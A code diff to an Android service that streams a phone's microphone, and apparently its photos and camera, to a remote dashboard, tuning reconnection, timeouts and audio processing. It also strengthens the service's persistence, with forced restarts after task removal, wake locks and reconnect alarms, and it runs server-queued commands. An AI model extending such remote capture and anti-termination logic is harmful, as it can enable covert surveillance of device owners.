@@ -120,15 +120,26 @@ class MicService : Service() {
     private var webSocket: WebSocket? = null
     private val isWsConnecting = java.util.concurrent.atomic.AtomicBoolean(false)
     private var wsReconnectJob: Job? = null
-    private val reconnectMutex = Mutex()
+    private val reconnectScheduleLock = Any()
     private val cameraLiveMutex = Mutex()
     @Volatile private var wsReconnectAttempts = 0
     @Volatile private var wsConnectFailuresCount = 0 // For Bug 10: only rotate after real failures
     @Volatile private var sourceRotateAttempts = 0
     private val okHttpClient = OkHttpClient.Builder()
-        .connectTimeout(10, TimeUnit.SECONDS)
+        .connectTimeout(60, TimeUnit.SECONDS) // Bug Fix: 60s prevents timeout on Render free-tier cold starts
         .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
+        .writeTimeout(15, TimeUnit.SECONDS) // Detect stalled half-open sockets quickly on weak links
         .pingInterval(20, TimeUnit.SECONDS)        // More frequent keep-alive (was 30s)
+        .build()
+    private val httpClient = OkHttpClient.Builder()
+        .connectTimeout(60, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+    private val photoUploadClient = httpClient.newBuilder()
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
     // ── Recording state ──────────────────────────────────────────────────────
@@ -144,6 +155,7 @@ class MicService : Service() {
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
+    private var lowNetworkRecoveryStreak = 0
     private var lastDataHashStr: String = "" // Bug 5: String checksum for dedup
     // BUG-R1/R13 fix: single AtomicBoolean is the ONLY guard — isPhotoCaptureBusy removed
     private val photoCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)
@@ -171,6 +183,8 @@ class MicService : Service() {
     @Volatile private var cameraLiveStrictFacing = false
     private var cameraLiveJob: Job? = null
     @Volatile private var restartFromTaskRemoval = false
+    @Volatile private var reconnectAlarmTriggerAtElapsed = 0L
+    private val audioCaptureStoppedExternally = java.util.concurrent.atomic.AtomicBoolean(false)
 
     // ── PCM enhancement filter state (persists across frames for continuity) ──
     // Reset these at each capture start so a previous session's state is never reused.
@@ -302,30 +316,38 @@ class MicService : Service() {
         // Shared websocket for service health checks and optional future hooks.
         @Volatile var activeWebSocket: WebSocket? = null
         @Volatile var staticWakeLock: PowerManager.WakeLock? = null
+        val lastHttpFallbackWsState = java.util.concurrent.atomic.AtomicReference<Boolean?>(null)
     }
 
     // Layer 8: Multi-Server Failover
     @Volatile private var currentServerIndex = 0
     private val serverUrls: List<String> get() {
         val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
-        return listOf(
-            base
-        ).map { it.trimEnd('/') + "/$deviceId" }
+        return listOf(base.trimEnd('/') + "/$deviceId")
     }
-    private val serverUrl get() = serverUrls[currentServerIndex % serverUrls.size]
+    private val serverUrl get() = serverUrls[0]
 
     private val wsAuthToken: String
         get() = (prefs.getString("server_token", DEFAULT_SERVER_TOKEN) ?: DEFAULT_SERVER_TOKEN).trim()
 
     private val serverHttpBaseUrl: String
         get() {
-            // Bug B: Always use primary server index for HTTP calls
-            val base = serverUrls[0]
-            return base
-                .replace(Regex("^wss://"), "https://")
-                .replace(Regex("^ws://"), "http://")
-                .substringBefore("/$deviceId")
-                .trimEnd('/')
+            val normalized = serverUrls[0]
+                .replace(Regex("^wss://", RegexOption.IGNORE_CASE), "https://")
+                .replace(Regex("^ws://", RegexOption.IGNORE_CASE), "http://")
+                .trim()
+            return try {
+                val parsed = android.net.Uri.parse(normalized)
+                val scheme = when (parsed.scheme?.lowercase()) {
+                    "http", "https" -> parsed.scheme!!.lowercase()
+                    else -> "https"
+                }
+                val host = parsed.host ?: return normalized.trimEnd('/').replace(Regex("/audio(/.*)?$"), "")
+                val port = if (parsed.port > 0) ":${parsed.port}" else ""
+                "$scheme://$host$port"
+            } catch (_: Exception) {
+                normalized.trimEnd('/').replace(Regex("/audio(/.*)?$"), "")
+            }
         }
 
     // ────────────────────────────────────────────────────────────────────────
@@ -354,28 +376,25 @@ class MicService : Service() {
                 override fun onAvailable(network: Network) {
                     super.onAvailable(network)
                     Log.i(TAG, "Network mapped onAvailable! Forcing reconnect if needed")
-                    // Layer 5 (Network Listener)
-                    if (activeWebSocket == null && !isWsConnecting.get()) {
-                        currentServerIndex = 0 // Reset to primary since we just got network
-                        wsReconnectAttempts = 0 // Reset backoff for faster recovery (Bug 11)
-                        val intent = Intent(applicationContext, MicService::class.java)
-                        intent.action = ACTION_RECONNECT
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                            applicationContext.startForegroundService(intent)
-                        } else {
-                            applicationContext.startService(intent)
-                        }
+                    if (activeWebSocket != null) {
+                        startHttpFallbackSync()
+                        return
                     }
+                    currentServerIndex = 0 // Reset to primary since we just got network
+                    wsReconnectAttempts = 0 // Reset backoff for faster recovery
+                    scheduleWebSocketReconnect("network_available", forceRestart = true)
                     startHttpFallbackSync()
                 }
 
                 override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                     super.onCapabilitiesChanged(network, networkCapabilities)
-                    // Keep low-network mode under explicit dashboard control only.
-                    // We still adapt frame pacing while low-network mode is enabled.
-                    updateLowNetworkTransportTuning(networkCapabilities)
-                    if (isWebRtcStreaming) {
-                        applyAdaptiveBitrate()
+                    serviceScope.launch(Dispatchers.Main) {
+                        // Keep low-network mode under explicit dashboard control only.
+                        // We still adapt frame pacing while low-network mode is enabled.
+                        updateLowNetworkTransportTuning(networkCapabilities)
+                        if (isWebRtcStreaming) {
+                            applyAdaptiveBitrate()
+                        }
                     }
                 }
 
@@ -409,10 +428,24 @@ class MicService : Service() {
         val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
         val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
 
-        // Bug 2: Auto-enable low network mode when upload is constrained,
-        // unless the user has explicitly set it via dashboard toggle.
+        // Auto-enable low-network mode only when bandwidth is genuinely constrained.
+        // Disable requires two consecutive stronger samples to avoid ping-pong.
         if (!prefs.getBoolean("session_low_network_manual", false)) {
-            lowNetworkMode = (upKbps in 1..250) || (downKbps in 1..400)
+            val shouldEnableLowNetwork = (upKbps in 1..80) || (downKbps in 1..150)
+            if (shouldEnableLowNetwork) {
+                lowNetworkMode = true
+                lowNetworkRecoveryStreak = 0
+            } else if (lowNetworkMode && upKbps > 200 && downKbps > 200) {
+                lowNetworkRecoveryStreak++
+                if (lowNetworkRecoveryStreak >= 2) {
+                    lowNetworkMode = false
+                    lowNetworkRecoveryStreak = 0
+                }
+            } else {
+                lowNetworkRecoveryStreak = 0
+            }
+        } else {
+            lowNetworkRecoveryStreak = 0
         }
 
         if (!lowNetworkMode) {
@@ -457,6 +490,7 @@ class MicService : Service() {
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
         if (intent?.action == ACTION_RECONNECT && (intent.data?.schemeSpecificPart == "reconnect" || intent.data?.schemeSpecificPart == "restart")) {
+            reconnectAlarmTriggerAtElapsed = 0L
             wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
             if (activeWebSocket == null) {
                 Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
@@ -490,12 +524,23 @@ class MicService : Service() {
         Log.i(TAG, "onTaskRemoved — will schedule forced restart in onDestroy")
     }
     private fun scheduleForcedRestart() {
+        try {
+            (getSystemService(PowerManager::class.java)).newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "MicMonitor::RestartHandoffWakeLock"
+            ).apply {
+                setReferenceCounted(false)
+                acquire(5_000L)
+            }
+        } catch (_: Exception) {
+            null
+        }
         val restartIntent = Intent(applicationContext, MicService::class.java).apply {
             action = ACTION_RECONNECT
             data = android.net.Uri.parse("timer:restart") // Bug 13: Unique Intent
         }
         val pendingIntent = PendingIntent.getService(
-            this, 1, restartIntent,
+            this, 11, restartIntent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
@@ -715,9 +760,14 @@ class MicService : Service() {
         // Bug 10: Only rotate server after multiple consecutive connection failures.
         // Clean disconnects (onClosed) or first failures shouldn't immediately rotate.
         if (wsConnectFailuresCount >= 3) {
-            currentServerIndex++
             wsConnectFailuresCount = 0
-            Log.i(TAG, "Server rotated to index $currentServerIndex after 3 failures")
+            if (serverUrls.size > 1) {
+                currentServerIndex = (currentServerIndex + 1) % serverUrls.size
+                Log.i(TAG, "Server rotated to index $currentServerIndex after 3 failures")
+            } else {
+                currentServerIndex = 0
+                Log.i(TAG, "Single server configured; reconnecting primary URL")
+            }
         }
         
         activeWebSocket = null
@@ -743,8 +793,9 @@ class MicService : Service() {
         webSocket = null
         isWsConnecting.set(false)
         try { staleWs?.close(1001, reason) } catch (_: Exception) {}
-        startHttpFallbackSync()
-        scheduleWebSocketReconnect(reason, forceRestart = false)
+        serviceScope.launch(Dispatchers.Main) {
+            onWsDisconnected(reason)
+        }
     }
 
     // Safe WebSocket send with automatic error handling and reconnection
@@ -755,13 +806,17 @@ class MicService : Service() {
             if (ws == null) {
                 return false
             }
-            
-            when (data) {
+
+            val sent = when (data) {
                 is String -> ws.send(data)
                 is okio.ByteString -> ws.send(data)
                 else -> ws.send(data.toString())
             }
-            true
+            if (!sent) {
+                Log.w(TAG, "WebSocket send returned false; forcing reconnect")
+                handleSocketSendFailure("send_returned_false")
+            }
+            sent
         } catch (e: Exception) {
             Log.w(TAG, "WebSocket send failed: ${e.message}")
             handleSocketSendFailure("send_failed")
@@ -788,7 +843,6 @@ class MicService : Service() {
     }
 
     private var httpFallbackJob: Job? = null
-    private val lastHttpFallbackWsState = java.util.concurrent.atomic.AtomicReference<Boolean?>(null)
     
     private fun startHttpFallbackSync() {
         val currentWsState = activeWebSocket != null
@@ -809,7 +863,7 @@ class MicService : Service() {
                         .post(heartbeatBody)
                         .addHeader("X-Device-Id", deviceId)
                         .build()
-                    val response = okHttpClient.newCall(request).execute()
+                    val response = httpClient.newCall(request).execute()
                     if (response.isSuccessful) {
                         val body = response.body?.string()
                         if (!body.isNullOrBlank()) {
@@ -844,8 +898,8 @@ class MicService : Service() {
                         delayElapsed += 2000
                     }
                 } else {
-                    // Bug 6: Extend heartbeat interval when WS is healthy (3min→10min)
-                    delay(if (activeWebSocket != null) 600_000L else 30_000L)
+                    // Keep server liveness checks frequent enough to catch backend restarts.
+                    delay(if (activeWebSocket != null) 120_000L else 30_000L)
                 }
             }
         }
@@ -869,7 +923,7 @@ class MicService : Service() {
                 .url(url)
                 .addHeader("X-Device-Id", deviceId)
                 .build()
-            val response = okHttpClient.newCall(request).execute()
+            val response = httpClient.newCall(request).execute()
             if (response.isSuccessful) {
                 val body = response.body?.string()
                 if (!body.isNullOrBlank()) {
@@ -881,8 +935,11 @@ class MicService : Service() {
                         wantsMicStreaming = serverStreaming
                         prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
                     }
-                    // Process offline commands (Layer 9 pop)
-                    if (root.has("commands")) {
+                    val wasReplayed = root.optBoolean("replayed", false)
+                    if (wasReplayed) {
+                        Log.d(TAG, "Sync commands replayed; skipping duplicate execution")
+                    } else if (root.has("commands")) {
+                        // Process offline commands (Layer 9 pop)
                         processRecoveredCommands(root.getJSONArray("commands"), "http_sync")
                     }
                 }
@@ -902,52 +959,49 @@ class MicService : Service() {
     }
 
     private fun scheduleWebSocketReconnect(reason: String, forceRestart: Boolean = false) {
-        val previousJob = wsReconnectJob
-        if (forceRestart) {
+        val previousJob: Job?
+        synchronized(reconnectScheduleLock) {
+            previousJob = wsReconnectJob
             previousJob?.cancel()
-        } else if (previousJob?.isActive == true) {
-            return
-        }
-        
-        wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
-            if (forceRestart) {
+            wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
                 try {
-                    withTimeoutOrNull(2_000) { previousJob?.join() }
+                    try {
+                        withTimeoutOrNull(2_000) { previousJob?.join() }
+                    } catch (_: CancellationException) {
+                    }
+                    while (isActive && activeWebSocket == null) {
+                        if (!isNetworkUsable()) {
+                            updateNotification("Offline — waiting for network…")
+                            delay(2_000)
+                            continue
+                        }
+                        if (isWsConnecting.get()) {
+                            delay(1_000)
+                            continue
+                        }
+
+                        val delayMs = nextReconnectDelayMs()
+                        wsReconnectAttempts++
+                        updateNotification("Disconnected ($reason) — retry in ${delayMs / 1000}s…")
+
+                        // Bug 1: Wait FIRST, then connect (proper exponential backoff)
+                        // H-02: Check isActive frequently during long delays
+                        var elapsed = 0L
+                        while (isActive && elapsed < delayMs) {
+                            delay(500)
+                            elapsed += 500
+                        }
+                        if (!isActive) break
+
+                        // Recheck after delay — another path may have connected
+                        if (activeWebSocket != null || isWsConnecting.get()) continue
+
+                        connectWebSocket()
+
+                        // Give OkHttp time to complete the handshake before looping
+                        delay(5_000)
+                    }
                 } catch (_: CancellationException) {
-                }
-            }
-            reconnectMutex.withLock {
-                while (isActive && activeWebSocket == null) {
-                    if (!isNetworkUsable()) {
-                        updateNotification("Offline — waiting for network…")
-                        delay(2_000)
-                        continue
-                    }
-                    if (isWsConnecting.get()) {
-                        delay(1_000)
-                        continue
-                    }
-                    
-                    val delayMs = nextReconnectDelayMs()
-                    wsReconnectAttempts++
-                    updateNotification("Disconnected ($reason) — retry in ${delayMs / 1000}s…")
-
-                    // Bug 1: Wait FIRST, then connect (proper exponential backoff)
-                    // H-02: Check isActive frequently during long delays
-                    var elapsed = 0L
-                    while (isActive && elapsed < delayMs) {
-                        delay(500)
-                        elapsed += 500
-                    }
-                    if (!isActive) break
-
-                    // Recheck after delay — another path may have connected
-                    if (activeWebSocket != null || isWsConnecting.get()) continue
-
-                    connectWebSocket()
-
-                    // Give OkHttp time to complete the handshake before looping
-                    delay(5_000)
                 }
             }
         }
@@ -1608,10 +1662,10 @@ class MicService : Service() {
         localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)
         localAudioTrack?.setEnabled(true)
 
-        cachedIceServers = fetchIceServersFromServer()
+        val iceServersForSession = cachedIceServers
 
         val rtcConfig = PeerConnection.RTCConfiguration(
-            cachedIceServers
+            iceServersForSession
         ).apply {
             sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
             continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
@@ -1683,6 +1737,13 @@ class MicService : Service() {
         updateNotification("WebRTC mic active")
         sendHealthStatus("webrtc_started")
         sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
+        serviceScope.launch(Dispatchers.IO) {
+            val fresh = fetchIceServersFromServer()
+            if (fresh != cachedIceServers) {
+                cachedIceServers = fresh
+                Log.i(TAG, "ICE servers refreshed for next WebRTC session")
+            }
+        }
     }
     
     private fun stopWebRtcSession(notifyState: Boolean) {
@@ -1690,6 +1751,7 @@ class MicService : Service() {
         webRtcRecoveryJob = null
         iceWatchdogJob?.cancel()
         iceWatchdogJob = null
+        isCapturingGuard.set(false)
         // Removed unregisterNetworkCallbackForBitrate
         try {
             peerConnection?.close()
@@ -1897,7 +1959,7 @@ class MicService : Service() {
         return try {
             val reqBuilder = Request.Builder().url(url)
             if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
-            val response = okHttpClient.newCall(reqBuilder.build()).execute()
+            val response = httpClient.newCall(reqBuilder.build()).execute()
             if (!response.isSuccessful) return fallback
             val body = response.body?.string().orEmpty()
             if (body.isBlank()) return fallback
@@ -2067,12 +2129,6 @@ class MicService : Service() {
 
                     var httpSuccess = false
                     try {
-                        val photoClient = okHttpClient.newBuilder()
-                            .connectTimeout(15, TimeUnit.SECONDS)
-                            .writeTimeout(30, TimeUnit.SECONDS)
-                            .readTimeout(30, TimeUnit.SECONDS)
-                            .build()
-
                         val requestBody = MultipartBody.Builder()
                             .setType(MultipartBody.FORM)
                             .addFormDataPart("deviceId", deviceId)
@@ -2090,7 +2146,7 @@ class MicService : Service() {
                             .addHeader("X-Device-Id", deviceId)
                             .build()
 
-                        val response = photoClient.newCall(request).execute()
+                        val response = photoUploadClient.newCall(request).execute()
                         httpSuccess = response.isSuccessful
                         response.close()
                     } catch (e: Exception) {
@@ -2876,6 +2932,7 @@ class MicService : Service() {
             // ── PRIORITY BOOST: Audio thread and network binding ─────────────
             // Set highest audio priority for this thread
             android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
+            audioCaptureStoppedExternally.set(false)
             
             // Bug 4: DO NOT call bindProcessToNetwork() — it pins ALL sockets
             // (WebSocket, HTTP, etc.) to one network. When that network drops,
@@ -3035,14 +3092,20 @@ class MicService : Service() {
                 val wasCapturing = isCapturing
                 isCapturing = false
                 isCapturingGuard.set(false)
+                val stoppedExternally = audioCaptureStoppedExternally.getAndSet(false)
                 // BUG-R2: Only call audioRecord.stop() if it hasn't already been stopped by stopAudioCapture().
                 // Calling stop() on an already-stopped AudioRecord returns ERROR_INVALID_OPERATION
                 // which previously propagated as a phantom mic_read_error to the dashboard.
-                if (audioRecord != null) {
-                    try { audioRecord?.stop() } catch (_: Exception) {}
+                val rec = audioRecord
+                if (rec != null) {
+                    if (!stoppedExternally) {
+                        try { rec.stop() } catch (_: Exception) {}
+                    }
                     releaseSessionAudioEffects()
-                    try { audioRecord?.release() } catch (_: Exception) {}
-                    audioRecord = null
+                    try { rec.release() } catch (_: Exception) {}
+                    if (audioRecord === rec) {
+                        audioRecord = null
+                    }
                 }
                 if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                 Log.i(TAG, "Audio capture stopped")
@@ -3073,7 +3136,7 @@ class MicService : Service() {
                 }
 
                 // Layer 6: Watchdog - stall detection reduced to 10s as requested
-                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 10_000)
+                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                 if (!isCapturing || stalled) {
                     isRecoveringMic = true
                     try {
@@ -3136,9 +3199,8 @@ class MicService : Service() {
                     val sid = rec.audioSessionId
                     if (NoiseSuppressor.isAvailable()) {
                         try {
-                            val canEnableHardwareNs = source == MediaRecorder.AudioSource.UNPROCESSED
                             noiseSuppressor = NoiseSuppressor.create(sid)?.also { e ->
-                                e.enabled = voiceProfile == "far" && canEnableHardwareNs
+                                e.enabled = voiceProfile == "far"
                             }
                         } catch (_: Exception) {}
                     }
@@ -3187,7 +3249,7 @@ class MicService : Service() {
         smoothedGain = 1.0
         sourceRotateAttempts = 0
         spectralDenoiser.reset()
-        realtimeDenoiserWarmupChunksRemaining = 30
+        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 50 else 30
     }
 
     /**
@@ -3248,7 +3310,7 @@ class MicService : Service() {
             eq1Y1 = y
             val wet = when (p) {
                 "near" -> if (strongAi) 0.22 else 0.16
-                "far" -> if (strongAi) 0.28 else 0.20
+                "far" -> if (strongAi) 0.45 else 0.35
                 else -> if (strongAi) 0.16 else 0.12
             }
             work[i] = x * (1.0 - wet) + y * wet
@@ -3277,9 +3339,7 @@ class MicService : Service() {
             }
             hfShelfPrevOut = prevOut
         } else if (willBeMuLaw) {
-            // Issue B: Keep hfShelf state primed so transition back to PCM is seamless.
-            // Without this, stale hfShelfPrevOut from many frames ago causes an audible click.
-            hfShelfNeedsPrime = true
+            // Keep hfShelfPrevOut continuity during MuLaw segments so PCM resumes without a click.
         }
 
         // ── Stage 3: Spectral denoise ──
@@ -3293,7 +3353,7 @@ class MicService : Service() {
             spectralDenoiser.denoise(work)
             if (preDenoise != null) {
                 val blendOriginal = when (p) {
-                    "far" -> 0.65
+                    "far" -> if (estimatedNoiseDb > -56.0) 0.40 else 0.55
                     "near" -> 0.55
                     else -> 0.45
                 }
@@ -3312,7 +3372,7 @@ class MicService : Service() {
         val gainCeil = when {
             willBeMuLaw -> 3.0
             p == "near" -> if (strongAi) 4.5 else 3.5
-            p == "far" -> if (strongAi) 5.5 else 4.5
+            p == "far" -> if (strongAi) 4.0 else 4.5
             else -> if (strongAi) 4.0 else 3.5
         }
         val gainTarget = when {
@@ -3321,10 +3381,12 @@ class MicService : Service() {
             p == "far" -> if (strongAi) 19500.0 else 16500.0
             else -> if (strongAi) 12500.0 else 10500.0
         }
-        val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
+        val effectiveGainCeil = if (inWarmup) min(gainCeil, 1.5) else gainCeil
+        val effectiveGainTarget = if (inWarmup) min(gainTarget, 8000.0) else gainTarget
+        val rawGain = (effectiveGainTarget / rms).coerceIn(1.0, effectiveGainCeil)
         // Faster recovery after impulsive peaks without overreacting to single-frame transients.
         smoothedGain = if (rawGain > smoothedGain)
-            smoothedGain * 0.55 + rawGain * 0.45
+            smoothedGain * 0.75 + rawGain * 0.25
         else
             smoothedGain * 0.88 + rawGain * 0.12
         val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
@@ -3336,7 +3398,13 @@ class MicService : Service() {
             p == "near" -> 5.5
             else -> 6.5
         }
-        val combinedGain = (smoothedGain * userGain).coerceIn(1.0, maxCombined)
+        var peakAbs = 1.0
+        for (i in 0 until samples) {
+            val abs = kotlin.math.abs(work[i])
+            if (abs > peakAbs) peakAbs = abs
+        }
+        val preGainCap = if (peakAbs > 24_000.0) 24_000.0 / peakAbs else maxCombined
+        val combinedGain = (smoothedGain * userGain).coerceIn(1.0, min(maxCombined, preGainCap))
         for (i in 0 until samples) work[i] *= combinedGain
 
         // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
@@ -3383,12 +3451,13 @@ class MicService : Service() {
         val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
         val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
 
-        // On cellular: always MuLaw unless upload bandwidth is known-good (>512 kbps)
-        if (isCellular && upKbps < 512) return AUDIO_CODEC_MULAW_8K
+        // Only drop to MuLaw when bandwidth is genuinely constrained.
+        if (isCellular && upKbps in 1..100) return AUDIO_CODEC_MULAW_8K
         // On WiFi with constrained upload: use MuLaw
-        if (isWifi && upKbps in 1..300) return AUDIO_CODEC_MULAW_8K
-        // No network info or reconnect attempts: compress
-        if (upKbps == 0 || wsReconnectAttempts >= 1) return AUDIO_CODEC_MULAW_8K
+        if (isWifi && upKbps in 1..80) return AUDIO_CODEC_MULAW_8K
+        // Unknown network estimate: only compress after repeated reconnect churn.
+        if (upKbps == 0 && wsReconnectAttempts >= 2) return AUDIO_CODEC_MULAW_8K
+        if (wsReconnectAttempts >= 3) return AUDIO_CODEC_MULAW_8K
         return AUDIO_CODEC_PCM16_16K  // Full quality only when network is confirmed good
     }
 
@@ -3403,10 +3472,8 @@ class MicService : Service() {
         val out = ByteArray(outLen)
         var o = 0
         var i = 0
-        // NEW-5: Proper single-pole IIR at ~3.4 kHz (α = 0.58 at 16 kHz sample rate).
-        // Previous filter (cutoff ~5-6 kHz) let content above Nyquist (4 kHz) alias through,
-        // causing "buzzy/metallic" voice quality. This is the biggest audio quality fix.
-        val alpha = 0.58
+        // Single-pole prefilter before 2:1 decimation (targets ~3.4kHz at 16kHz sample rate).
+        val alpha = 0.747
         while (i + 3 < pcm16.size) {
             val s0 = readLeSample(pcm16, i).toDouble()
             val s1 = readLeSample(pcm16, i + 2).toDouble()
@@ -3484,7 +3551,7 @@ class MicService : Service() {
         private val readyOut = ArrayDeque<Double>(FRAME * 4)
 
         // Noise power spectrum (one value per positive frequency bin)
-        private val noisePow = DoubleArray(BINS)
+        private val noisePow = DoubleArray(BINS) { 1e6 }
         /** FFT frames processed (always increments). */
         private var fftFramesProcessed = 0
         /** Frames where noise estimate was updated from quiet content only. */
@@ -3495,7 +3562,7 @@ class MicService : Service() {
             inFill = HOP            // re-prime with zeros
             outBuf.fill(0.0)
             readyOut.clear()
-            noisePow.fill(0.0)
+            noisePow.fill(1e6)
             fftFramesProcessed = 0
             noiseAdaptFrames = 0
         }
@@ -3692,6 +3759,7 @@ class MicService : Service() {
 
     private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
         isCapturing = false
+        audioCaptureStoppedExternally.set(true)
         // Cancel job FIRST — this throws CancellationException into the running coroutine,
         // which causes the coroutine's finally block to skip audioRecord.stop() (already null'd here).
         // BUG-R2: Nulling audioRecord BEFORE cancel prevents the coroutine's stop() call from
@@ -3954,16 +4022,22 @@ class MicService : Service() {
      * The alarm reschedules itself each time it fires, creating a rolling chain.
      */
     private fun scheduleReconnectAlarm() {
+        val now = SystemClock.elapsedRealtime()
+        if (activeWebSocket != null && reconnectAlarmTriggerAtElapsed > now) {
+            Log.d(TAG, "Reconnect alarm already scheduled; keeping existing timer")
+            return
+        }
         val intent = Intent(applicationContext, MicService::class.java).apply {
             action = ACTION_RECONNECT
             data = android.net.Uri.parse("timer:reconnect") // Fixed URI to avoid leaking intents
         }
         val pendingIntent = PendingIntent.getService(
-            applicationContext, 2, intent,
+            applicationContext, 10, intent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
-        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
+        val triggerAt = now + 8 * 60 * 1000L
+        reconnectAlarmTriggerAtElapsed = triggerAt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             // Bug 2: On Android 12+ exact alarms need SCHEDULE_EXACT_ALARM permission
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
